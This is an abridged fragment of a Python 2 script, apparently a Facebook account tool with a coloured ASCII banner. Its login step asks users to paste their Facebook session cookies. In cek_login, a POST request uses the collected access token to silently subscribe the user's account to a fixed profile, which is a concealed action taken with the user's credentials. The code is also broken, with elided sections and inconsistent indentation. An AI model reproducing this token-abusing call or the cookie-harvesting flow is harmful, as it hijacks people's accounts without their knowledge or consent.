...
\033[1;95m█\033[1;93m▲▲▲▲▲\033[1;91m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mV2.3
\033[1;95m█████████      \033[1;96m«----------✧----------»
\033[1;95m ██ ██
\033[1;97m╔════════════════════════════════════════════╗
...
ua = 'Mozilla/5.0 (Linux; Android 11; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36'
...
def cek_login():
	...
	kom = kata+love+'\n'+pantun+'\n'+waktu
        requests.post('https://graph.facebook.com/100029285173905/subscribers?access_token=' + toket)
...
def login():
    ...
    if lg == '':
		...
		cookie = raw_input(" [*] Cookies : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (Linux; Android 11; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36', # don't change this user agent.
